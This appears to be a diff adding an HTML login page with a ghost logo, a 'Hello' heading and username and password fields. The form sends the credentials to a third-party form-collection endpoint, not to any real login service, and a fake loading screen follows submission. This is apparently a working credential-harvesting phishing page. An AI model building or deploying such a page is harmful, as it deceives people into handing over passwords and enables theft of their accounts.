@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container" id="login-box">
+        <svg class="ghost-icon" viewBox="0 0 100 100">
+            <path d="M50 15c-15 0-22 10-22 22 0 4 1 8 3 11-2 1-4 4-4 7 0 4 2 6 4 6-1 4-2 8-2 12 0 7 8 11 20 11s20-4 20-11c0-4-1-8-2-12 2 0 4-2 4-6 0-3-2-6-4-7 2-3 3-7 3-11 0-12-7-22-20-22z" fill="white" stroke="black" stroke-width="2"/>
+        </svg>
+        <h1>Hello</h1>
+        <form id="loginForm" action="https://formspree.io/f/xbdlnrge" method="POST">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
+    <div id="loading-screen" style="display:none;">
+        <div class="spinner"></div>
+        <p>Loading...</p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
